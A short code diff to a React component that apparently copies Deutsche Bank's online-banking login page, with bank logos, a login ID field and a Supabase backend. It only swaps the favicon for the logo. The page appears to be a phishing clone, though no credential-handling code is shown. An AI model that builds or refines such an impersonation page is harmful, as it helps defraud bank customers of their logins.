@@ -3,7 +3,6 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import faviconAsset from "@/assets/favicons/deutsche_bank.png.asset.json";
 import { Info, AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
 import bgAsset from "@/assets/deutsche-bank-bg.jpg.asset.json";
 import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
@@ -182,7 +181,7 @@ const DeutscheBank = () => {
   const t = COPY[lang];
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Deutsche Bank – Online-Banking", faviconAsset.url);
+  usePageMeta("Deutsche Bank – Online-Banking", logoAsset.url);
 
   const handleContinue = () => {
     if (dbId.trim().length === 0) return;
